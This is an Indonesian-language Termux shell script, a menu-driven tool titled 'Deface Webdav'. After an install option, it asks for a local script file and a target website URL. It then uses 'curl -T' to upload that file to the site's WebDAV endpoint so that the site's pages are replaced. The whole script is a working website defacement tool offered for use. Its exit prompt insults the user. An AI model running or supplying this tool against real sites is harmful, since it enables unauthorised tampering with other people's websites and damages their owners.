clear
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
echo $red"╔══════════════════════════════════╗"
echo $red"║"$green"           Deface Webdav"$red"          ║"
echo $red"╠══════════════════════════════════╝"
echo $red"║"
echo $red"║"$white"["$green"01"$white"]"$purple "Install"
echo $red"║"$white"["$green"02"$white"]"$purple "Langsung Deface"
echo $red"║"$white"["$green"00"$white"]"$red "Exit"
echo $red"║"
read -p "╚════════════════[+]PILIH: " pilih
if [ $pilih = 1 ] || [ $pilih = 01 ]
then
clear
echo $red"╔══════════════════╗"
echo $red"║"$green"      Install"$red"     ║"
echo $red"╚══════════════════╝"
pkg update && pkg upgrade
pkg install curl
termux-setup-storage
cd ..
cd come
sh deface.sh
fi
if [ $pilih = 2 ] || [ $pilih = 02 ]
then
clear
echo $red"╔══════════════════╗"
echo $red"║"$yellow"     Deface"$white" ["$green"√"$white"]"$red"   ║"
echo $red"╠══════════════════╝"
read -p "║•>Masukan Nama Script : " sc
read -p "║•>Masukan Nama Web : " wb
cd $HOME
curl -T/sdcard/$sc $wb
echo $red"╚═"$white"["$green" √ "$white"]"$green"Done"
sleep 2
read -p '[ULANG]' ex
cd /data/data/com.termux/files/home/Zmanias/come
sh deface.sh
sleep 1
fi
if [ $pilih = 0 ] || [ $pilih = 00 ]
then
echo $red'Keluar Bangsat!!!'
sleep 2
cd /data/data/com.termux/files/home/Zmanias/come
sh menu.sh
fi
if [ $pilih =  ]
then
echo $yellow"Isi Dengan Benar!!"
sleep 3
cd /data/data/com.termux/files/home/Zmanias/come
sh deface.sh
fi
